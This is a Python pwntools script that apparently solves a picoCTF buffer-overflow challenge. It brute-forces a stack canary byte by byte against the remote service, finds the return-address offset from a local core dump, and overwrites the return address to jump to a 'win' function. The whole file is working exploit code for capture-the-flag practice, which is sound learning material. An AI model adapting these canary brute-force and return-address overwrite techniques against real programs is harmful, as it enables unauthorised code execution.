import pwn
from itertools import chain


DEBUG = True
BUFSIZE = 64
CANARY_SIZE = 4
HOST, PORT = 'saturn.picoctf.net', 56136
pwn.context.log_level = 'error'


def run_payload(proc: pwn.tube, payload: bytes) -> None:
    payload_length = str(len(payload)).encode()
    proc.sendline(payload_length)
    proc.sendline(payload)


def brute_canary():
    def get_canary_bytes(canary): return b''.join(pwn.p8(c) for c in canary)
    canary = [0x00]
    for position in range(CANARY_SIZE):
        # Loop over values in [A-Za-z]
        for value in chain(range(0x41, 0x5B), range(0x61, 0x7B)):
            canary[position] = value
            proc = pwn.remote(HOST, PORT)
            canary_bytes = get_canary_bytes(canary)
            payload = b'A'*BUFSIZE + canary_bytes
            run_payload(proc, payload)
            result = proc.recvall().decode()
            if "Stack Smashing" not in result:
                if DEBUG:
                    print("Canary so far:", get_canary_bytes(canary))
                if len(canary) == CANARY_SIZE:
                    break
                canary.append(0x00)
                break
    return get_canary_bytes(canary)


def get_offset_and_address(canary):
    elf = pwn.ELF("./vuln")
    proc = elf.process()
    pwn.context.delete_corefiles = True
    pattern = pwn.cyclic(150)
    # Create a payload with the proper canary value (test canary)
    payload = pattern[:BUFSIZE] + canary + pattern[CANARY_SIZE+BUFSIZE:]
    run_payload(proc, payload)
    
    # Wait for process to crash
    proc.wait()
    core = proc.corefile
    eip = core.eip
    # Find the pattern offset of the EIP register 
    # and then subtract our padding buffer and canary size
    offset = pwn.cyclic_find(eip) - BUFSIZE - CANARY_SIZE
    return offset, elf.symbols['win']


canary = brute_canary()
test_canary = b'CCCC'
r = pwn.remote(HOST, PORT)
offset, win_address = get_offset_and_address(test_canary)
payload = pwn.flat(b'A'*BUFSIZE, canary,
                   b'D'*offset, pwn.p32(win_address))
run_payload(r, payload)
print(r.recvall().decode().splitlines()[-1])
